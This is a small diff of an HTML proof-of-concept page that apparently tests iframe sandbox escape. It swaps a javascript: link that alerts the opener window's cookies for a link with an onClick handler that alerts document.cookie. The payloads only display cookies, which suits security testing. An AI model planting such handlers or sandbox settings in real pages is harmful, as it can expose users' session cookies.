@@ -8,7 +8,8 @@
     iframe.sandbox = 'allow-popups-to-escape-sandbox'
     document.body.appendChild(iframe);
   </script>
-  <a target="_blank" href="javascript:alert(window.opener.document.cookie);">poc1</a>
+<!--   <a target="_blank" href="javascript:alert(window.opener.document.cookie);">poc1</a> -->
+  <a href="http://xss.vg/" onClick="alert(document.cookie)" nextpage="">unsafe!</a>
 </body>
 
 </html>
